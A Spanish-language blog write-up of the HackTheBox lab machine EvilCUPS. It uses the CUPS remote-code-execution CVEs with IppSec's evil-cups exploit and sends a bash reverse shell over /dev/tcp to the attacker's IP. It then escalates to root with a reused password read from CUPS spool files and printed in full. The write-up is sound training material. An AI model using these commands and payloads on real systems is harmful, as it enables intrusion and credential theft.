---
layout: single
title: write up EvilCUPS
excerpt:
date: 2024-11-07
classes: wide
header:
  teaser: /assets/images/EvilCUPS/0_uZO541QLUUyiyuW1-1681376233.png
  teaser_home_page: true
categories:
  - hacking
  - linux
  - 
tags:  
  - hacking
  - linux
---

![](/assets/images/EvilCUPS/0_uZO541QLUUyiyuW1-1681376233.png)
"EvilCUPS" es una máquina de HackTheBox basada en vulnerabilidades del servicio CUPS que permiten ejecución remota de comandos. Siguiendo un tutorial reciente, logramos acceso inicial al sistema y, al revisar archivos de configuración de CUPS, encontramos una contraseña reutilizada para root, lo que nos dio control total del sistema.

lo primero que vamos a hacer es ejecutar los escaneos de nmap:
```bash
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 10.10.11.40 -oG allports
```
![](/assets/images/EvilCUPS/Pastedimage20241107151258.png)

```bash
nmap -sCV -p22,631 10.10.11.40 -oN ports
```
![](/assets/images/EvilCUPS/Pastedimage20241107151642.png)
vemos que nos da la version de cups que es la 2.4 una version antigua del 2022.
tambien podemos ver que hay http por lo que alomejor hay una web.
vamos a usar whatweb para averiguarlo:
```bash
whatweb 10.10.11.40:631
```
![](/assets/images/EvilCUPS/Pastedimage20241107152132.png)
como podemos ver hay algo por lo que vamos a ponerlo en el navegador
![](/assets/images/EvilCUPS/Pasted image 20241107152436.png)
nada mas entrar vemos otra vez la version del servicio y multiples enlaces a los cuales podemos acceder.
antes de ponerme a tocar voy a preferir ejecutar un gobuster para ver si encuentro algo mas
```bash
 gobuster dir -u http://10.10.11.40:631/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 30 -x php,html,php.bak,bak,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.40:631/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php.bak,bak,txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 2262]
/help                 (Status: 200) [Size: 3137]
/jobs                 (Status: 200) [Size: 2329]
/jobs.txt             (Status: 200) [Size: 2329]
/jobs.html            (Status: 200) [Size: 2329]
/jobs.php.bak         (Status: 200) [Size: 2329]
/jobs.php             (Status: 200) [Size: 2329]
/jobs.bak             (Status: 200) [Size: 2329]
/de                   (Status: 200) [Size: 2316]
/fr                   (Status: 200) [Size: 2340]
/admin                (Status: 403) [Size: 370]
/admin.html           (Status: 403) [Size: 370]
/admin.php            (Status: 403) [Size: 370]
/admin.bak            (Status: 403) [Size: 370]
/admin.txt            (Status: 403) [Size: 370]
/admin.php.bak        (Status: 403) [Size: 370]
/es                   (Status: 200) [Size: 2478]
/ru                   (Status: 200) [Size: 2739]
/ja                   (Status: 200) [Size: 2263]
/printers.php.bak     (Status: 200) [Size: 2388]
/printers.bak         (Status: 200) [Size: 2388]
/printers             (Status: 200) [Size: 2388]
/printers.html        (Status: 200) [Size: 2388]
/printers.php         (Status: 200) [Size: 2388]
/printers.txt         (Status: 200) [Size: 2388]
/classes.php.bak      (Status: 200) [Size: 2003]
/classes              (Status: 200) [Size: 2003]
/classes.bak          (Status: 200) [Size: 2003]
/classes.php          (Status: 200) [Size: 2003]
/classes.txt          (Status: 200) [Size: 2003]
/classes.html         (Status: 200) [Size: 2003]
/robots.txt           (Status: 200) [Size: 95]
/administration       (Status: 403) [Size: 370]
/administration.txt   (Status: 403) [Size: 370]
/administration.html  (Status: 403) [Size: 370]
/administration.php   (Status: 403) [Size: 370]
/administration.php.bak (Status: 403) [Size: 370]
/administration.bak   (Status: 403) [Size: 370]
/da                   (Status: 200) [Size: 2311]
/'                    (Status: 403) [Size: 370]
/'.php                (Status: 403) [Size: 370]
/'.php.bak            (Status: 403) [Size: 370]
/'.html               (Status: 403) [Size: 370]
/'.bak                (Status: 403) [Size: 370]
/'.txt                (Status: 403) [Size: 370]
/jobsearch.php        (Status: 200) [Size: 2329]
/jobsearch            (Status: 200) [Size: 2329]
/jobsearch.html       (Status: 200) [Size: 2329]
/jobsearch.bak        (Status: 200) [Size: 2329]
/jobsearch.php.bak    (Status: 200) [Size: 2329]
/jobsearch.txt        (Status: 200) [Size: 2329]
/jobseeker            (Status: 200) [Size: 2329]
/jobseeker.bak        (Status: 200) [Size: 2329]
/jobseeker.txt        (Status: 200) [Size: 2329]
/jobseeker.php        (Status: 200) [Size: 2329]
/jobseeker.php.bak    (Status: 200) [Size: 2329]
/jobseeker.html       (Status: 200) [Size: 2329]
Progress: 32619 / 7642998 (0.43%)
```
no parece aver nada interesante por lo que vamos a tocar la pagina
si nos vamos a http://10.10.11.40:631/printers/
veremos lo siguiente:
![](/assets/images/EvilCUPS/Pastedimage20241107153439.png)
si clicamos sobre Canon_MB2300_series veremos que nos da cierta infromacion de la impresora
![](/assets/images/EvilCUPS/Pasted image 20241107153634.png)
tambien si vemos Show completed jobs saldran las tareas completadas (en vuestro caso solo os saldra una no como a mi que me puse a tocar antes de escribir xdd)
![](/assets/images/EvilCUPS/Pastedimage20241107153804.png)
como podemos ver hay dos usuarios Withheld y anonymous ( este ultimo es que usado yo y que no os aparecera)
lo interesante esque tenemos poder sobre el usuario anonymous pero por ejemplo si intentamos haceder a http://10.10.11.40:631/admin nos suelta un 403 forbiden
![](/assets/images/EvilCUPS/Pastedimage20241107154158.png)
por lo aqui entran los siguientes CVE:
[CVE-2024-47176](https://nvd.nist.gov/vuln/detail/CVE-2024-47176)
[CVE-2024-47076](https://nvd.nist.gov/vuln/detail/CVE-2024-47076)
[CVE-2024-47175](https://nvd.nist.gov/vuln/detail/CVE-2024-47175)
[CVE-2024-47177](https://nvd.nist.gov/vuln/detail/CVE-2024-47177)
basicamente lo que hay que comprobar el puerto 631 por UDP, si esta abierto podemos ejecuatr remote code execution (RCE)
por lo que podemos usar nmap para ver si es correcto:
```bash
nmap -sU -p631 10.10.11.40
```
![](/assets/images/EvilCUPS/Pastedimage20241107154858.png)
como podemos ver esta abierto por lo que genial (para nostros como atacantes claro)
vamos a darnos el lujazo de que vamos a usar el siguiente exploit para poder vulnerar el servicio 
https://github.com/IppSec/evil-cups.git
para isntalarlo es asi:
```bash
❯ git clone https://github.com/IppSec/evil-cups.git
<SNIP>

❯ cd evil-cups

❯ python3 -m venv evilcups_env

❯ source evilcups_env/bin/activate

❯ pip3 install -r requirements.txt

❯ python3 evilcups.py -h
evilcups.py <LOCAL_HOST> <TARGET_HOST> <COMMAND>
```
vale una vez echo abrimos otra terminal y nos ponemos en escucha por un puerto, en mi caso voy a elejir el 443 (no afecta en nado solo es por gusto)
```bash
nc -nvlp 443
```
ahora el exploit tiene un pero por ejemplo, nos enviamos una reverse shell ésta compartirá el mismo PID del proceso que está corriendo la impresora
para comprenderlo mejor voy a citar una explicacion de otro write up que lo explica fabulosamente y os dejo el enlace tambien al writeup oficial
https://gunzf0x.github.io/pentesting/es/posts/evilcups/
cito:
"por ejemplo, nos enviamos una reverse shell ésta compartirá el mismo `PID` del proceso que está corriendo la impresora. De manera que, si por A, B, C motivo la mala impresora (agregada) se muere o es removida, nuestra reverse shell también morirá ya que es un proceso “child” (hijo) de ésta. Puede haber un proceso corriendo por detrás el cual elimina las impresoras no deseadas. Por tanto, nuestra reverse shell podría morir. Para sobrepasar este problema podemos crear un nuevo `PID` el cual se haga cargo del proceso de la reverse shell utilizando el comando `nohup` junto con el de la reverse shell. Por tanto, si realizamos esta secuencia de ataque para `CUPS`, se recomienda hacerlo utilizando `nohup` para crear un proceso independiente.

Como último aviso, en la vida real puede que no haya un proceso removiendo constantemente las impresoras no deseadas. De ser ese el caso (el cual es más realista), y por alguna razón nuestra reverse shell muere, tendremos que cambiar nuestra dirección IP dado que al realizar la inyección ésta no aceptará un nuevo archivo `PPD`. Supongo que por eso la gente de HTB fue considerada y agregó el proceso de borrar impresoras. De otro modo necesitaríamos cambiar la IP cada vez que la reverse shell muere o, incluso, si es que simplemente ejecutamos un `ping` para saber si el exploit funcionaba."

vale una vez dicho esto vamos a ejecuat el exploit de la siguiente forma:
```bash
python3 evilcups.py 10.10.16.74 10.10.11.40 'nohup bash -c "bash -i >& /dev/tcp/10.10.16.74/443 0>&1" &'
```
y esperamos unos 30 segundos
pasados esos 30 segundos si vamos a http://10.10.11.40:631/printers/ veremos la impresora maliciosa
![](/assets/images/EvilCUPS/Pastedimage20241107160105.png)
si la selecionamos y imprimimos una pagina de ejmplo 
pum estamos dentro
![](/assets/images/EvilCUPS/Pastedimage20241107160207.png)
![](/assets/images/EvilCUPS/Pastedimage20241107160221.png)
ahora para el escalado de privilegios 
## escalado de privilegios
hay un directorio cups donde en general se almacena todo. problema no tenemos haceso pero si podemos ejecutar comando:
![](/assets/images/EvilCUPS/Pastedimage20241107160946.png)
por lo que si investigamos un poco descubrimos que suelen tener una nomeglatura generica los archivos gracias a la documentacion oficial de cups
por lo que si supuestamente hacemos un:
```bash
cat /var/spool/cups/d00001-001
```
deveria ver una/unas contraseña/s
![](/assets/images/EvilCUPS/Pastedimage20241107161244.png)
y exacto hay la tenemos.
si nos la copiamos y con netexect para ver si es de root:
```bash
nxc ssh 10.10.11.40 -u 'root' -p 'Br3@k-G!@ss-r00t-evilcups'
```
![](/assets/images/EvilCUPS/Pastedimage20241107161436.png)
y vemos que si por lo que ya solo es entrar por ssh y somos root
![](/assets/images/EvilCUPS/Pastedimage20241107161548.png)
